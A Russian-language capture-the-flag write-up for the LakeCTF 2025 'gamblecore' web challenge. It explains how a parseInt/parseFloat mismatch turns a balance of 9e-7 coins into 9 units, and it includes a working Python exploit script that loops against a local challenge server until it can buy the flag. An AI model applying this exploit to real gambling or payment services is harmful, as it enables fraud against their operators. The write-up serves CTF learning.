# gamblecore
**LakeCTF 2025**

Приложение-казино: с 10 игровых монет (0.001 цента) нужно подняться до 10 долларов и купить на них флаг. Изучив исходники найдем следующий функционал:
* `/api/balance` - получение текущего баланса
* `/api/gamble` - сыграть в казино: вероятность выигрыша 9, в случае победы ставка возвращается в десятикратном размере
* `/api/convert` - конвертация игровых монет в доллары
* `/api/flag` - покупка флага

Необходимо заметить, что в коде по-разному реализован парсинг поля `amount`.В функции ставки в казино используется `parseFloat()`
```
app.post('/api/gamble', (req, res) => {
    const { currency, amount } = req.body;
    
    if (!['coins', 'usd'].includes(currency)) {
        return res.status(400).json({ error: 'Invalid currency' });
    }

    let betAmount = parseFloat(amount);
    if (isNaN(betAmount) || betAmount <= 0) {
        return res.status(400).json({ error: 'Invalid amount' });
    }
    ...
```

А в фунцкции конвертации `parseInt()`
```
app.post('/api/convert', (req, res) => {
    let { amount } = req.body;

    const wallet = req.session.wallet;
    const coinBalance = parseInt(wallet.coins);
    amount = parseInt(amount);
    if (isNaN(amount) || amount <= 0) {
        return res.status(400).json({ error: 'Invalid amount' });
    }
    ...
```

При этом в коде отсутствует проверка, что `amount` - целое число. Погуглив, можно найти что `parseInt()` ожидает строку на входе. При получении на вход числа оно автоматически будет преобразовано в строку. При этом, если число меньше $10^{-6} = 0.000001$, то JavaScript преобразует его в строку в научной нотации: `0.0000009=9e-7`. `parseInt()` получив строку `9e-7` вместо `0` вернет первое число в строе: `9`.

Алгоритм эксплуатации уязвимости следующий:
1. Добиться, чтобы наш баланс был меньше `0.000001`
2. Конвертируем весь баланс в доллары
3. Пытаемся выиграть в слоте 3 раза подряд со ставками 0.01$, 0.1$, 1$

```
import requests
import time

BASE_URL = "http://0.0.0.0:1337"

def gamble(curr, n):
    payload = {
        "currency": curr,
        "amount": n
    }
    return s.post(f"{BASE_URL}/api/gamble", json=payload).json()

def convert():
    return s.post(f"{BASE_URL}/api/convert", json={f"amount": 9}).json()

def buy_flag():
    return s.post(f"{BASE_URL}/api/flag").json()

def get_balance():
    return s.get(f"{BASE_URL}/api/balance").json()["usd"]

while True:
    s = requests.Session()
    if not gamble("coins", 0.0000091)['win']:
        convert()
        while get_balance() >= 0.01:
            if gamble("usd", 0.01)['win']:
                if gamble("usd", 0.1)['win']:
                    if gamble("usd", 1)['win']:
                        print(buy_flag())
                        exit()
```

#web #js #number_conversion